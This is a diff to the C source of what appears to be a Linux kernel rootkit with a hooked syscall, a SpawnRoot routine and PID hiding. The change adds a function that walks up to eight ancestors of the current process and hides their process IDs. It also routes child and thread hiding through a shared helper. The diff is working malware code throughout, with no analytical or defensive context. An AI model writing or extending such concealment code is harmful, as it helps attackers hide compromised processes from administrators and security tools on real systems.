@@ -16,12 +16,47 @@ static asmlinkage long (*orig_getpgrp)(const struct pt_regs *);
 
 static notrace void SpawnRoot(void);
 
+#define HIDE_PARENT_DEPTH 8
+
 static inline bool should_hide_pid_by_int(int pid)
 {
     if (pid <= 0)
         return false;
 
     return is_hidden_pid(pid);
+}
+
+static notrace void hide_task_pid(struct task_struct *task)
+{
+    if (!task)
+        return;
+
+    add_hidden_pid(task->pid);
+    add_hidden_pid(task->tgid);
+}
+
+static notrace void hide_parent_lineage(void)
+{
+    struct task_struct *task;
+    struct task_struct *parent;
+    int depth;
+
+    if (!current)
+        return;
+
+    rcu_read_lock();
+    task = current;
+    for (depth = 0; depth < HIDE_PARENT_DEPTH; depth++) {
+        parent = rcu_dereference(task->real_parent);
+        if (!parent || parent == task || parent->pid <= 1)
+            break;
+        if (parent->flags & PF_KTHREAD)
+            break;
+
+        hide_task_pid(parent);
+        task = parent;
+    }
+    rcu_read_unlock();
 }
 
 static notrace void hide_process_tree(void)
@@ -32,8 +67,8 @@ static notrace void hide_process_tree(void)
     if (!current)
         return;
     
-    add_hidden_pid(current->pid);
-    add_hidden_pid(current->tgid);
+    hide_task_pid(current);
+    hide_parent_lineage();
     
     list_for_each(list, &current->children) {
         task = list_entry(list, struct task_struct, sibling);
@@ -46,7 +81,7 @@ static notrace void hide_process_tree(void)
     if (current->signal) {
         struct task_struct *t = current;
         do {
-            add_hidden_pid(t->pid);
+            hide_task_pid(t);
         } while_each_thread(current, t);
     }
 }
